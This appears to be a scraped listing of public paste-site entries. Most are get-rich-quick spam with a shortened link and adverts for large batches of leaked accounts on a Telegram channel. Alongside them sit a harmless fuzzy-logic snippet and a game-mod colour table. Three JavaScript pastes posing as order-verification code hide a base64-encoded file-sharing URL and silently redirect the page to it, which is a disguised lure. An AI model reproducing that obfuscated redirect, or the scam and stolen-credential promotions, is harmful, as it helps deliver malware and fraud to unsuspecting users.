id,title,username,language,date,content
eaXap6LB,Make $1000 15-MINUTES  (BEGINNER) ME,TankhunLkdasdas,JavaScript,Saturday 26th of April 2025 07:06:48 AM CDT," 
Pdf https://tinyurl.com/privguidee

CaLQ6PQC1z
"
D7u6ggAB,Untitled,jm33,JavaScript,Saturday 26th of April 2025 06:59:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96885/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xMmC8C2m,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Saturday 26th of April 2025 06:57:26 AM CDT,67775 Accounts Posted On https://t.me/leakedbyem1nem
tQcHAAFa,Make $1000 15-MINUTES (BEGINNER) 96,kapuas88,JavaScript,Saturday 26th of April 2025 06:57:22 AM CDT," 
Pdf https://tinyurl.com/privguidee

PAEuOiBT4s
"
72A9zFAK,EARN $900 INSTANTLY 2025‚≠ê NU,kapuas88,JavaScript,Saturday 26th of April 2025 06:48:07 AM CDT," 
Pdf https://tinyurl.com/privguidee

e7Ouo6alpe
"
M4NTKyFm,Products.js,jm33,JavaScript,Saturday 26th of April 2025 06:43:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50700/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TicBXsc7,Chaturbate with Tokens,hubertzoo90,JavaScript,Saturday 26th of April 2025 06:42:04 AM CDT,64289 Accounts Posted On https://t.me/leakedbyem1nem
trGcikMz,Make $1000 15-MINUTES  (BEGINNER) ME,kapuas88,JavaScript,Saturday 26th of April 2025 06:38:49 AM CDT," 
Pdf https://tinyurl.com/privguidee

aE8VinDaUR
"
5nx3F0jT,EARN $900 INSTANTLY 2025 M6,kapuas88,JavaScript,Saturday 26th of April 2025 06:29:33 AM CDT," 
Pdf https://tinyurl.com/privguidee

b3SGf4k7Wa
"
mg5Azvw0,Order.js,jm33,JavaScript,Saturday 26th of April 2025 06:28:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07106/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
332iTSj6,Crypto Accounts,hubertzoo90,JavaScript,Saturday 26th of April 2025 06:26:40 AM CDT,52886 Accounts Posted On https://t.me/leakedbyem1nem
Cy3Gmt8p,Untitled,gandalfbialy,Python,Saturday 26th of April 2025 06:21:12 AM CDT,"life = ctrl.Antecedent(x_life, 'Zycie gracza')
distance = ctrl.Antecedent(x_dist, 'Odleglosc')
attack = ctrl.Consequent(x_attack, 'Poziom ataku')

life['Niskie'] = fuzz.trimf(life.universe, [0, 0, 40])
life['Srednie'] = fuzz.trimf(life.universe, [30, 50, 70])
life['Wysokie'] = fuzz.trimf(life.universe, [60, 100, 100])

distance['Mala'] = fuzz.trimf(distance.universe, [0, 0, 15])
distance['Duza'] = fuzz.trimf(distance.universe, [10, 50, 50])

attack['Brak'] = fuzz.trimf(attack.universe, [0, 0, 30])
attack['Ostrozny'] = fuzz.trimf(attack.universe, [50, 70, 90])
attack['Zdecydowany'] = fuzz.trimf(attack.universe, [80, 100, 100])

rule1 = ctrl.Rule(life['Niskie'], attack['Zdecydowany'])
rule2 = ctrl.Rule(life['Srednie'] & distance['Duza'], attack['Ostrozny'])
rule3 = ctrl.Rule(life['Srednie'] & distance['Mala'], attack['Ostrozny'])
rule4 = ctrl.Rule(life['Wysokie'] & distance['Mala'], attack['Brak'])

attack_ctrl = ctrl.ControlSystem([rule1, rule2, rule3, rule4])
attack_sim = ctrl.ControlSystemSimulation(attack_ctrl)

attack_sim.input['Zycie gracza'] = 35
attack_sim.input['Odleglosc'] = 20

attack_sim.compute()

print(""Poziom ataku:"", attack_sim.output['Poziom ataku'])
attack.view(sim=attack_sim)"
kP7KJVVd,Make $1000 15-MINUTES (BEGINNER) 96,kapuas88,JavaScript,Saturday 26th of April 2025 06:20:18 AM CDT," 
Pdf https://tinyurl.com/privguidee

p9emIlgTKp
"
L1q9cvpb,EARN $900 INSTANTLY 2025 M6,onlyredqueen,JavaScript,Saturday 26th of April 2025 06:19:54 AM CDT," 
Pdf https://tinyurl.com/privguidee

JcXsoGpEr9
"
v39RjgBN,Krastorio2.lua,PLaSoft,Lua,Saturday 26th of April 2025 06:17:35 AM CDT,"Krastorio2={
    ['kr-advanced-fuel']                                       ={r=151, g=011, b=255, a=127}, --Advanced fuel
    ['kr-advanced-radar']                                      ={r=204, g=208, b=164, a=127}, --Advanced radar





    ['kr-advanced-tech-card']                                  ={r=255, g=236, b=000, a=127}, --Advanced tech card
    ['kr-ai-core']                                             ={r=255, g=028, b=000, a=127}, --AI core


    ['kr-anti-material-rifle']                                 ={r=226, g=000, b=000, a=127}, --Anti-materiel rifle
    ['kr-anti-material-rifle-magazine']                        ={r=255, g=175, b=000, a=127}, --Anti-materiel rifle magazine
    ['kr-antimatter-reactor-equipment']                        ={r=000, g=246, b=255, a=127}, --Portable antimatter reactor
    ['kr-antimatter-turret-rocket']                            ={r=255, g=000, b=187, a=127}, --Antimatter turret rocket
    ['kr-armor-piercing-anti-material-rifle-magazine']         ={r=255, g=004, b=000, a=127}, --Armor piercing anti-materiel rifle magazine
    ['kr-armor-piercing-pistol-magazine']                      ={r=255, g=039, b=000, a=127}, --Armor piercing pistol magazine
    ['kr-armor-piercing-rifle-magazine']                       ={r=255, g=004, b=000, a=127}, --Armor piercing rifle magazine
    ['kr-automation-core']                                     ={r=255, g=067, b=000, a=127}, --Automation core
    ['kr-automation-tech-card']                                ={r=255, g=000, b=009, a=127}, --Automation tech card
    ['kr-basic-tech-card']                                     ={r=244, g=136, b=036, a=127}, --Basic tech card
    ['kr-additional-engine']                                   ={r=255, g=238, b=193, a=127}, --Additional electric engine
    ['kr-advanced-additional-engine']                          ={r=189, g=193, b=255, a=127}, --Advanced additional electric engine
    ['kr-advanced-exoskeleton-equipment']                      ={r=000, g=082, b=255, a=127}, --Advanced exoskeleton
    ['kr-antimatter-artillery-shell']                          ={r=255, g=000, b=215, a=127}, --Antimatter artillery shell
    ['kr-antimatter-railgun-shell']                            ={r=255, g=000, b=178, a=127}, --Antimatter railgun shell
    ['kr-antimatter-rocket']                                   ={r=255, g=000, b=228, a=127}, --Antimatter rocket
    ['kr-bio-fuel']                                            ={r=004, g=222, b=000, a=127}, --Biofuel
    ['kr-biomass']                                             ={r=244, g=168, b=220, a=127}, --Biomass
    ['kr-biters-research-data']                                ={r=138, g=118, b=110, a=127}, --Biter research data
    ['kr-biusart-lab']                                         ={r=000, g=140, b=255, a=127}, --Advanced lab
    ['kr-blank-tech-card']                                     ={r=255, g=187, b=151, a=127}, --Blank tech card
    ['kr-charged-antimatter-fuel-cell']                        ={r=227, g=000, b=255, a=127}, --Charged antimatter fuel cell
    ['kr-charged-matter-stabilizer']                           ={r=164, g=000, b=255, a=127}, --Charged Matter stabilizer
    ['kr-artillery-shell']                                     ={r=255, g=060, b=000, a=127}, --Artillery shell
    ['kr-chemical-tech-card']                                  ={r=000, g=022, b=255, a=127}, --Chemical tech card
    ['kr-atomic-bomb']                                         ={r=033, g=255, b=000, a=127}, --Atomic bomb
    ['kr-cyber-potato-equipment']                              ={r=255, g=175, b=019, a=127}, --Cyber Potato
    ['kr-automation-science-pack']                             ={r=255, g=000, b=009, a=127}, --Automation science pack
    ['kr-dt-fuel']                                             ={r=255, g=112, b=000, a=127}, --DT-fuel
    ['kr-basic-railgun-shell']                                 ={r=160, g=204, b=255, a=127}, --Railgun shell
    ['kr-empty-antimatter-fuel-cell']                          ={r=255, g=019, b=000, a=127}, --Empty antimatter fuel cell
    ['kr-empty-dt-fuel']                                       ={r=255, g=191, b=000, a=127}, --Empty DT-fuel
    ['kr-energy-absorber']                                     ={r=255, g=127, b=000, a=127}, --Energy absorber
    ['kr-energy-control-unit']                                 ={r=255, g=000, b=242, a=127}, --Energy control unit
    ['kr-battery-mk2-equipment']                               ={r=000, g=143, b=255, a=127}, --Personal battery MK2
    ['kr-battery-mk3-equipment']                               ={r=255, g=000, b=255, a=127}, --Battery MK3
    ['kr-big-battery-equipment']                               ={r=000, g=255, b=005, a=127}, --Big personal battery
    ['kr-big-battery-mk2-equipment']                           ={r=000, g=135, b=255, a=127}, --Big personal battery MK2
    ['kr-big-battery-mk3-equipment']                           ={r=255, g=000, b=252, a=127}, --Big personal battery MK3
    ['kr-big-superior-solar-panel-equipment']                  ={r=219, g=000, b=255, a=127}, --Big portable imersite solar panel
    ['kr-enriched-rare-metals']                                ={r=255, g=180, b=000, a=127}, --Enriched rare metals
    ['kr-big-solar-panel-equipment']                           ={r=009, g=000, b=255, a=127}, --Big portable solar panel
    ['kr-explosive-turret-rocket']                             ={r=255, g=029, b=000, a=127}, --Explosive turret rocket
    ['kr-explosive-turret-rocket-turret']                      ={r=255, g=029, b=000, a=127}, --Explosive turret rocket
    ['kr-fertilizer']                                          ={r=140, g=148, b=072, a=127}, --Fertilizer
    ['kr-chemical-science-pack']                               ={r=000, g=022, b=255, a=127}, --Chemical science pack
    ['kr-first-aid-kit']                                       ={r=255, g=043, b=000, a=127}, --First aid kit
    ['kr-fuel']                                                ={r=255, g=034, b=000, a=127}, --Fuel
    ['kr-coke']                                                ={r=064, g=064, b=064, a=127}, --Coke
    ['kr-dolphin-gun']                                         ={r=128, g=152, b=180, a=127}, --Space Dolphin Gun
    ['kr-gps-satellite']                                       ={r=000, g=143, b=255, a=127}, --GPS satellite
    ['kr-electronic-components']                               ={r=142, g=255, b=000, a=127}, --Electronic components
    ['kr-energy-shield-equipment']                             ={r=000, g=255, b=006, a=127}, --Energy shield
    ['kr-imersite-anti-material-rifle-magazine']               ={r=185, g=000, b=255, a=127}, --Imersite anti-materiel rifle magazine
    ['kr-imersite-crystal']                                    ={r=253, g=000, b=255, a=127}, --Imersite crystal
    ['kr-energy-shield-mk2-equipment']                         ={r=000, g=143, b=255, a=127}, --Energy shield MK2
    ['kr-energy-shield-mk3-equipment']                         ={r=255, g=000, b=002, a=127}, --Shield generator MK3
    ['kr-energy-shield-mk4-equipment']                         ={r=155, g=015, b=255, a=127}, --Shield generator MK4
    ['kr-imersite-rifle-magazine']                             ={r=185, g=000, b=255, a=127}, --Imersite rifle magazine
    ['kr-enriched-copper']                                     ={r=255, g=080, b=000, a=127}, --Enriched copper
    ['kr-enriched-iron']                                       ={r=112, g=189, b=255, a=127}, --Enriched iron
    ['kr-imersium-beam']                                       ={r=216, g=048, b=248, a=127}, --Imersium beam
    ['kr-imersium-gear-wheel']                                 ={r=175, g=000, b=255, a=127}, --Imersium gear wheel
    ['kr-imersium-plate']                                      ={r=193, g=000, b=255, a=127}, --Imersium plate
    ['kr-improved-pollution-filter']                           ={r=255, g=186, b=000, a=127}, --Improved pollution filter
    ['kr-explosion-railgun-shell']                             ={r=255, g=026, b=000, a=127}, --Explosion railgun shell
    ['kr-firearm-magazine']                                    ={r=255, g=188, b=000, a=127}, --Firearm magazine
    ['kr-inserter-parts']                                      ={r=255, g=255, b=248, a=127}, --Inserter parts
    ['kr-iron-beam']                                           ={r=251, g=255, b=251, a=127}, --Iron beam
    ['kr-fusion-reactor-equipment']                            ={r=255, g=204, b=000, a=127}, --Portable fusion reactor
    ['kr-glass']                                               ={r=125, g=195, b=255, a=127}, --Glass
    ['kr-accelerator']                                         ={r=068, g=052, b=052, a=127}, --Accelerator
    ['kr-advanced-assembling-machine']                         ={r=255, g=018, b=160, a=127}, --Advanced assembling machine
    ['kr-advanced-chemical-plant']                             ={r=026, g=062, b=242, a=127}, --Advanced chemical plant
    ['kr-advanced-furnace']                                    ={r=060, g=052, b=044, a=127}, --Advanced furnace
    ['kr-advanced-loader']                                     ={r=000, g=255, b=009, a=127}, --Advanced loader
    ['kr-advanced-solar-panel']                                ={r=140, g=000, b=206, a=127}, --Advanced solar panel
    ['kr-advanced-splitter']                                   ={r=041, g=255, b=000, a=127}, --Advanced splitter
    ['kr-advanced-steam-turbine']                              ={r=110, g=110, b=122, a=127}, --Advanced steam turbine
    ['kr-advanced-tank']                                       ={r=192, g=140, b=020, a=127}, --Tank
    ['kr-advanced-transport-belt']                             ={r=072, g=255, b=000, a=127}, --Advanced transport belt
    ['kr-advanced-underground-belt']                           ={r=051, g=255, b=000, a=127}, --Advanced underground belt
    ['kr-air-purifier']                                        ={r=255, g=181, b=000, a=127}, --Air purifier
    ['kr-antimatter-reactor']                                  ={r=173, g=000, b=230, a=127}, --Antimatter reactor
    ['kr-atmospheric-condenser']                               ={r=250, g=154, b=018, a=127}, --Atmospheric condenser
    ['kr-big-active-provider-container']                       ={r=204, g=000, b=255, a=127}, --Active provider warehouse
    ['kr-big-buffer-container']                                ={r=008, g=212, b=000, a=127}, --Buffer warehouse
    ['kr-big-container']                                       ={r=084, g=084, b=084, a=127}, --Warehouse
    ['kr-big-passive-provider-container']                      ={r=255, g=015, b=000, a=127}, --Passive provider warehouse
    ['kr-big-requester-container']                             ={r=000, g=109, b=255, a=127}, --Requester warehouse
    ['kr-big-storage-container']                               ={r=255, g=179, b=000, a=127}, --Storage warehouse
    ['kr-bio-lab']                                             ={r=255, g=002, b=000, a=127}, --Bio lab
    ['kr-biter-virus']                                         ={r=255, g=000, b=218, a=127}, --Anti biter virus capsule
    ['kr-black-reinforced-plate']                              ={r=126, g=114, b=114, a=127}, --Black reinforced plate
    ['kr-black-reinforced-plate-l']                            ={r=126, g=114, b=114, a=127}, --__ITEM__kr-black-reinforced-plate__ (KL)
    ['kr-creep']                                               ={r=244, g=168, b=220, a=127}, --Biter creep
    ['kr-creep-collector']                                     ={r=255, g=243, b=243, a=127}, --Creep collector
    ['kr-creep-virus']                                         ={r=255, g=000, b=218, a=127}, --Anti creep virus capsule
    ['kr-crusher']                                             ={r=255, g=187, b=000, a=127}, --Crusher
    ['kr-electric-mining-drill-mk2']                           ={r=000, g=085, b=255, a=127}, --Electric mining drill Mk2
    ['kr-electric-mining-drill-mk3']                           ={r=193, g=009, b=255, a=127}, --Electric mining drill Mk3
    ['kr-electrolysis-plant']                                  ={r=000, g=110, b=255, a=127}, --Electrolysis plant
    ['kr-energy-storage']                                      ={r=158, g=142, b=158, a=127}, --Energy storage
    ['kr-express-loader']                                      ={r=000, g=138, b=255, a=127}, --Express loader
    ['kr-fast-loader']                                         ={r=255, g=000, b=000, a=127}, --Fast loader
    ['kr-filtration-plant']                                    ={r=000, g=150, b=255, a=127}, --Filtration plant
    ['kr-fluid-burner']                                        ={r=255, g=193, b=000, a=127}, --Fluid burner
    ['kr-fluid-storage-1']                                     ={r=255, g=165, b=091, a=127}, --Large storage tank
    ['kr-fluid-storage-2']                                     ={r=255, g=165, b=091, a=127}, --Huge storage tank
    ['kr-fuel-refinery']                                       ={r=255, g=046, b=000, a=127}, --Fuel refinery
    ['kr-fusion-reactor']                                      ={r=255, g=182, b=000, a=127}, --Fusion reactor
    ['kr-gas-power-station']                                   ={r=255, g=123, b=064, a=127}, --Gas power station
    ['kr-greenhouse']                                          ={r=057, g=255, b=000, a=127}, --Greenhouse
    ['kr-intergalactic-transceiver']                           ={r=255, g=000, b=166, a=127}, --Intergalactic transceiver
    ['kr-jackhammer']                                          ={r=255, g=159, b=000, a=127}, --Jackhammer
    ['kr-large-roboport']                                      ={r=255, g=183, b=000, a=127}, --Large roboport
    ['kr-laser-artillery-turret']                              ={r=255, g=189, b=000, a=127}, --Laser artillery turret
    ['kr-loader']                                              ={r=255, g=184, b=000, a=127}, --Loader
    ['kr-matter-assembler']                                    ={r=000, g=255, b=255, a=127}, --Matter assembler
    ['kr-matter-plant']                                        ={r=184, g=000, b=255, a=127}, --Matter plant
    ['kr-medium-active-provider-container']                    ={r=204, g=000, b=255, a=127}, --Medium active provider container
    ['kr-medium-buffer-container']                             ={r=008, g=212, b=000, a=127}, --Medium buffer container
    ['kr-medium-container']                                    ={r=084, g=084, b=084, a=127}, --Medium container
    ['kr-medium-passive-provider-container']                   ={r=255, g=015, b=000, a=127}, --Medium passive provider container
    ['kr-medium-requester-container']                          ={r=000, g=109, b=255, a=127}, --Medium requester container
    ['kr-medium-storage-container']                            ={r=255, g=179, b=000, a=127}, --Medium storage container
    ['kr-mineral-water-pumpjack']                              ={r=000, g=238, b=234, a=127}, --Mineral water pumpjack
    ['kr-note-1']                                              ={r=255, g=206, b=000, a=127}, --Mystery note
    ['kr-nuclear-locomotive']                                  ={r=057, g=255, b=011, a=127}, --Nuclear locomotive
    ['kr-oil-pumpjack']                                        ={r=068, g=052, b=048, a=127}, --Oil pumpjack
    ['kr-quantum-computer']                                    ={r=024, g=039, b=255, a=127}, --Quantum computer
    ['kr-quarry-drill']                                        ={r=003, g=016, b=255, a=127}, --Quarry drill
    ['kr-railgun-turret']                                      ={r=255, g=183, b=000, a=127}, --Railgun turret
    ['kr-research-server']                                     ={r=255, g=183, b=000, a=127}, --Research server
    ['kr-rocket-turret']                                       ={r=255, g=186, b=000, a=127}, --Rocket turret

    ['kr-sentinel']                                            ={r=255, g=186, b=000, a=127}, --Sentinel
    ['kr-shelter']                                             ={r=255, g=183, b=000, a=127}, --Shelter
    ['kr-shelter-plus']                                        ={r=255, g=247, b=240, a=127}, --Advanced shelter
    ['kr-singularity-beacon']                                  ={r=146, g=118, b=066, a=127}, --Singularity beacon
    ['kr-singularity-lab']                                     ={r=000, g=053, b=255, a=127}, --Singularity lab
    ['kr-small-roboport']                                      ={r=255, g=181, b=000, a=127}, --Small roboport
    ['kr-stabilizer-charging-station']                         ={r=192, g=016, b=180, a=127}, --Stabilizer charging station
    ['kr-steel-pipe']                                          ={r=237, g=240, b=255, a=127}, --Steel pipe
    ['kr-steel-pipe-to-ground']                                ={r=204, g=228, b=252, a=127}, --Steel underground pipe
    ['kr-steel-pump']                                          ={r=150, g=202, b=206, a=127}, --Steel pump
    ['kr-substation-mk2']                                      ={r=122, g=062, b=254, a=127}, --Substation mk2
    ['kr-superior-filter-inserter']                            ={r=182, g=000, b=255, a=127}, --Superior filter inserter
    ['kr-superior-inserter']                                   ={r=104, g=136, b=136, a=127}, --Superior inserter
    ['kr-superior-loader']                                     ={r=192, g=000, b=255, a=127}, --Superior loader
    ['kr-superior-long-filter-inserter']                       ={r=255, g=220, b=000, a=127}, --Superior long filter inserter
    ['kr-superior-long-inserter']                              ={r=255, g=026, b=000, a=127}, --Superior long inserter
    ['kr-superior-splitter']                                   ={r=156, g=000, b=255, a=127}, --Superior splitter
    ['kr-superior-transport-belt']                             ={r=170, g=000, b=255, a=127}, --Superior transport belt
    ['kr-superior-underground-belt']                           ={r=157, g=000, b=255, a=127}, --Superior underground belt
    ['kr-tesla-coil']                                          ={r=255, g=175, b=015, a=127}, --Tesla coil
    ['kr-void']                                                ={r=008, g=008, b=008, a=127}, --Nothing
    ['kr-white-reinforced-plate']                              ={r=242, g=226, b=214, a=127}, --Light reinforced plate
    ['kr-white-reinforced-plate-l']                            ={r=242, g=226, b=214, a=127}, --__ITEM__kr-white-reinforced-plate__ (KL)
    ['kr-wind-turbine']                                        ={r=255, g=188, b=000, a=127}, --Wind turbine
    ['kr-heavy-rocket']                                        ={r=255, g=086, b=000, a=127}, --Heavy rocket
    ['kr-heavy-rocket-launcher']                               ={r=146, g=122, b=078, a=127}, --Heavy rocket launcher
    ['kr-lithium-sulfur-battery']                              ={r=255, g=197, b=000, a=127}, --Lithium‚Äìsulfur battery

    ['kr-logistic-tech-card']                                  ={r=000, g=255, b=009, a=127}, --Logistic tech card
    ['kr-imersite-night-vision-equipment']                     ={r=233, g=000, b=255, a=127}, --Imersite night vision
    ['kr-imersite-powder']                                     ={r=146, g=018, b=255, a=127}, --Imersite powder
    ['kr-matter-stabilizer']                                   ={r=217, g=000, b=255, a=127}, --Matter stabilizer
    ['kr-imersite-rounds-magazine']                            ={r=255, g=000, b=247, a=127}, --Imersite rounds magazine
    ['kr-matter-tech-card']                                    ={r=000, g=233, b=255, a=127}, --Matter tech card
    ['kr-imersite-solar-panel-equipment']                      ={r=185, g=000, b=255, a=127}, --Portable imersite solar panel
    ['kr-impulse-rifle-ammo']                                  ={r=255, g=000, b=119, a=127}, --Impulse rifle ammo
    ['kr-military-tech-card']                                  ={r=255, g=245, b=231, a=127}, --Military tech card
    ['kr-nuclear-artillery-shell']                             ={r=016, g=255, b=000, a=127}, --Nuclear artillery shell
    ['kr-nuclear-reactor-equipment']                           ={r=006, g=255, b=000, a=127}, --Portable nuclear reactor
    ['kr-nuclear-turret-rocket']                               ={r=000, g=255, b=003, a=127}, --Nuclear turret rocket
    ['kr-optimization-tech-card']                              ={r=152, g=132, b=120, a=127}, --Optimization tech card
    ['kr-impulse-rifle']                                       ={r=255, g=000, b=225, a=127}, --Impulse rifle
    ['kr-iron-gear-wheel']                                     ={r=255, g=202, b=126, a=127}, --Iron gear wheel
    ['kr-personal-laser-defense-mk3-equipment']                ={r=255, g=000, b=009, a=127}, --Personal laser defense MK3
    ['kr-personal-laser-defense-mk4-equipment']                ={r=240, g=000, b=255, a=127}, --Personal laser defense MK4
    ['kr-iron-plate']                                          ={r=255, g=237, b=213, a=127}, --Iron plate
    ['kr-lithium-chloride']                                    ={r=203, g=221, b=255, a=127}, --Lithium chloride
    ['kr-personal-sniper-laser-defense-mk3-equipment']         ={r=255, g=000, b=009, a=127}, --Personal sniper laser defense MK3
    ['kr-personal-sniper-laser-defense-mk4-equipment']         ={r=240, g=000, b=255, a=127}, --Personal sniper laser defense MK4
    ['kr-lithium']                                             ={r=160, g=160, b=124, a=127}, --Lithium
    ['kr-logistic-science-pack']                               ={r=000, g=255, b=009, a=127}, --Logistic science pack
    ['kr-matter-cube']                                         ={r=000, g=148, b=255, a=127}, --Matter cube
    ['kr-matter-research-data']                                ={r=105, g=250, b=255, a=127}, --Matter research data
    ['kr-pistol-magazine']                                     ={r=255, g=188, b=000, a=127}, --Pistol magazine
    ['kr-pollution-filter']                                    ={r=255, g=183, b=000, a=127}, --Pollution filter
    ['kr-poop']                                                ={r=230, g=114, b=006, a=127}, --Mystery substance

    ['kr-potato']                                              ={r=255, g=183, b=055, a=127}, --Potato
    ['kr-military-science-pack']                               ={r=255, g=245, b=231, a=127}, --Military science pack
    ['kr-personal-laser-defense-equipment']                    ={r=000, g=255, b=042, a=127}, --Personal laser defense
    ['kr-personal-laser-defense-mk2-equipment']                ={r=000, g=146, b=255, a=127}, --Personal laser defense MK2
    ['kr-production-tech-card']                                ={r=248, g=000, b=182, a=127}, --Production tech card
    ['kr-personal-sniper-laser-defense-mk1-equipment']         ={r=000, g=255, b=042, a=127}, --Personal sniper laser defense
    ['kr-personal-sniper-laser-defense-mk2-equipment']         ={r=000, g=146, b=255, a=127}, --Personal sniper laser defense MK2
    ['kr-rare-metals']                                         ={r=138, g=150, b=222, a=127}, --Rare metals
    ['kr-personal-submachine-laser-defense-mk1-equipment']     ={r=000, g=255, b=042, a=127}, --Personal submachine laser defense
    ['kr-raw-rare-metals']                                     ={r=073, g=193, b=255, a=127}, --Raw rare metals
    ['kr-rifle-magazine']                                      ={r=255, g=193, b=000, a=127}, --Rifle magazine
    ['kr-personal-submachine-laser-defense-mk2-equipment']     ={r=000, g=146, b=255, a=127}, --Personal submachine laser defense MK2
    ['kr-personal-submachine-laser-defense-mk3-equipment']     ={r=255, g=000, b=009, a=127}, --Personal submachine laser defense MK3
    ['kr-personal-submachine-laser-defense-mk4-equipment']     ={r=240, g=000, b=255, a=127}, --Personal submachine laser defense MK4
    ['kr-piercing-rounds-magazine']                            ={r=255, g=039, b=000, a=127}, --Piercing rounds magazine
    ['kr-portable-generator']                                  ={r=116, g=168, b=188, a=127}, --Portable generator
    ['kr-power-armor-mk3']                                     ={r=022, g=051, b=255, a=127}, --Power armor MK3
    ['kr-singularity-tech-card']                               ={r=254, g=000, b=255, a=127}, --Singularity tech card
    ['kr-power-armor-mk4']                                     ={r=245, g=000, b=255, a=127}, --Power armor MK4
    ['kr-space-research-data']                                 ={r=255, g=185, b=168, a=127}, --Space research data
    ['kr-production-science-pack']                             ={r=248, g=000, b=182, a=127}, --Production science pack
    ['kr-space-tech-card']                                     ={r=152, g=132, b=120, a=127}, --Space tech card
    ['kr-spoiled-potato']                                      ={r=080, g=100, b=012, a=127}, --Spoiled potato
    ['kr-steel-beam']                                          ={r=197, g=193, b=255, a=127}, --Steel beam

    ['kr-pumpjack']                                            ={r=068, g=052, b=048, a=127}, --Pumpjack
    ['kr-quartz']                                              ={r=231, g=237, b=255, a=127}, --Quartz
    ['kr-superior-exoskeleton-equipment']                      ={r=219, g=000, b=255, a=127}, --Superior exoskeleton
    ['kr-teleportation-gps-module']                            ={r=000, g=143, b=255, a=127}, --Teleportation GPS module
    ['kr-tritium']                                             ={r=019, g=255, b=000, a=127}, --Tritium
    ['kr-uranium-anti-material-rifle-magazine']                ={r=028, g=255, b=000, a=127}, --Uranium anti-materiel rifle magazine
    ['kr-uranium-rifle-magazine']                              ={r=000, g=255, b=072, a=127}, --Uranium rifle magazine
    ['kr-used-improved-pollution-filter']                      ={r=162, g=078, b=062, a=127}, --Used improved pollution filter
    ['kr-used-pollution-filter']                               ={r=255, g=179, b=000, a=127}, --Used pollution filter
    ['kr-raw-imersite']                                        ={r=222, g=000, b=255, a=127}, --Raw imersite
    ['kr-utility-tech-card']                                   ={r=255, g=173, b=000, a=127}, --Utility tech card
    ['kr-sand']                                                ={r=255, g=214, b=153, a=127}, --Sand
    ['kr-shield-generator-mk1']                                ={r=000, g=255, b=006, a=127}, --Shield generator
    ['kr-shield-generator-mk2']                                ={r=000, g=143, b=255, a=127}, --Shield generator MK2
    ['kr-shield-generator-mk3']                                ={r=255, g=000, b=002, a=127}, --Shield generator MK3
    ['kr-shield-generator-mk4']                                ={r=155, g=015, b=255, a=127}, --Shield generator MK4
    ['kr-silicon']                                             ={r=150, g=182, b=255, a=127}, --Silicon
    ['kr-small-portable-generator']                            ={r=246, g=234, b=166, a=127}, --Small portable generator
    ['kr-space-science-pack']                                  ={r=152, g=132, b=120, a=127}, --Space science pack
    ['kr-steel-gear-wheel']                                    ={r=204, g=207, b=255, a=127}, --Steel gear wheel
    ['kr-steel-plate']                                         ={r=202, g=206, b=238, a=127}, --Steel plate
    ['kr-utility-science-pack']                                ={r=255, g=173, b=000, a=127}, --Utility science pack
    ['kr-vehicle-roboport']                                    ={r=190, g=162, b=102, a=127}, --Vehicle roboport

    ['kr-ammonia']                                             ={r=026, g=026, b=230, a=127}, --Ammonia
    ['kr-biomethanol']                                         ={r=093, g=255, b=000, a=127}, --Biomethanol
    ['kr-chlorine']                                            ={r=102, g=255, b=000, a=127}, --Chlorine
    ['kr-dirty-water']                                         ={r=255, g=170, b=000, a=127}, --Dirty water
    ['kr-heavy-water']                                         ={r=028, g=255, b=085, a=127}, --Heavy water


    ['kr-hydrogen-chloride']                                   ={r=113, g=255, b=000, a=127}, --Hydrogen chloride
